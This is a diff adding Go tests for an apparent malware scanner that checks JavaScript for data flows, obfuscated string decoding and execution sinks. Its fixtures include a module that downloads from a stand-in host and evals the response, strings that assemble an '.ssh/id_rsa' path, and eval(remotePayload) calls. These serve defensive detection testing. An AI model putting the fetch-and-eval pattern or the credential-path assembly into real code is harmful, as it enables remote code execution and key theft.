@@ -342,6 +342,29 @@ async function parse() {
 	}
 }
 
+func TestTopLevelModuleAxiosFlow(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "module.mjs", "const response = await axios.get('https://example.invalid/data');\neval(response.data);\n")
+	writeFixture(t, root, "ordinary.mjs", "const response = await axios.get('https://example.invalid/data');\nconsole.log(response.data);\nfunction unrelated() { eval(localExpression); }\n")
+	coverage, findings := New(Options{}).Scan(context.Background(), root)
+	if !coverage.Complete {
+		t.Fatalf("module scan was incomplete: %+v", coverage)
+	}
+	seen := false
+	for _, finding := range findings {
+		if finding.RuleID != "FLOW-001" {
+			continue
+		}
+		if finding.Path != "module.mjs" || len(finding.Locations) != 2 || finding.Locations[0].StartLine != 1 || finding.Locations[1].StartLine != 2 {
+			t.Fatalf("module flow lost source/sink precision or flagged ordinary data: %+v", finding)
+		}
+		seen = true
+	}
+	if !seen {
+		t.Fatalf("top-level module response execution was missed: %+v", findings)
+	}
+}
+
 func TestLiteralDecodeRetainsSourceLocation(t *testing.T) {
 	root := t.TempDir()
 	writeFixture(t, root, "README.md", "fixture\n")
@@ -391,6 +414,7 @@ func TestUnsupportedLiteralDecodeMarksCoverageIncomplete(t *testing.T) {
 		{"expression", "const value = String.fromCharCode(65 + externalInput);\n", "unsupported JavaScript literal expression"},
 		{"rotation", "const table = ['a', 'b']; table['push'](table['shift']());\n", "dynamic string-table rotation"},
 		{"mutated table", "const pieces = ['.ssh/', 'id_rsa']; pieces.push('extra'); const path = pieces[0] + pieces[1];\n", "unsupported JavaScript literal expression"},
+		{"aliased table mutation", "const pieces = ['.ssh/', 'id_rsa']; const alias = pieces; alias[0] = 'public/'; const path = pieces[0] + pieces[1];\n", "unsupported JavaScript literal expression"},
 		{"array items", "const bytes = new Uint8Array([" + strings.Repeat("65,", 8192) + "65]);\n", "decoder array-item limit"},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -400,7 +424,7 @@ func TestUnsupportedLiteralDecodeMarksCoverageIncomplete(t *testing.T) {
 			if coverage.Complete || !strings.Contains(strings.Join(coverage.Skipped, " "), test.reason) {
 				t.Fatalf("unsupported content did not report incomplete coverage: %+v", coverage)
 			}
-			if test.name == "mutated table" && hasRule(findings, "DECODE-001") {
+			if (test.name == "mutated table" || test.name == "aliased table mutation") && hasRule(findings, "DECODE-001") {
 				t.Fatalf("mutated table was decoded using its original order: %+v", findings)
 			}
 		})
@@ -457,6 +481,9 @@ func TestGeneratedCodeSignalsAreDetected(t *testing.T) {
 	root := t.TempDir()
 	writeFixture(t, root, "packed.js", "eval('x');\n"+strings.Repeat("abcdefghijklmnopqrstuvwxyz0123456789", 20))
 	writeFixture(t, root, "obfuscated.js", "const token = /\\s/; eval(payload);\n")
+	for _, path := range []string{"server/routes/rules.js", "server/signature.js", "server/indicator.js"} {
+		writeFixture(t, root, path, "eval(remotePayload);\n")
+	}
 	_, findings := New(Options{}).Scan(context.Background(), root)
 	if !hasRule(findings, "OBFS-004") || !hasRule(findings, "OBFS-005") {
 		t.Errorf("missing generated minification/entropy checks: %+v", findings)
@@ -472,6 +499,20 @@ func TestGeneratedCodeSignalsAreDetected(t *testing.T) {
 	}
 	if !seen {
 		t.Fatalf("regex-like executable source was missed: %+v", findings)
+	}
+	for _, path := range []string{"server/routes/rules.js", "server/signature.js", "server/indicator.js"} {
+		found := false
+		for _, finding := range findings {
+			if finding.Path == path && finding.RuleID == "EXEC-001" {
+				found = true
+				if finding.Context != "executable" {
+					t.Fatalf("executable source was downgraded by its filename: %+v", finding)
+				}
+			}
+		}
+		if !found {
+			t.Fatalf("execution finding missing for %s", path)
+		}
 	}
 }
 
@@ -895,6 +936,15 @@ func TestUndecodableScriptCannotReportCompleteCoverage(t *testing.T) {
 	coverage, _ := New(Options{}).Scan(context.Background(), repo)
 	if coverage.Complete || len(coverage.Skipped) < 5 || !strings.Contains(strings.Join(coverage.Skipped, " "), "undecodable") {
 		t.Fatalf("undecodable script reported complete: %+v", coverage)
+	}
+}
+
+func TestExcessiveLineCountMarksRuleCoverageIncomplete(t *testing.T) {
+	repo := t.TempDir()
+	writeFixture(t, repo, "many.js", strings.Repeat("x\n", 250001))
+	coverage, _ := New(Options{}).Scan(context.Background(), repo)
+	if coverage.Complete || !strings.Contains(strings.Join(coverage.Skipped, " "), "line-count limit") {
+		t.Fatalf("excessive line count must be visible as incomplete: %+v", coverage)
 	}
 }
 
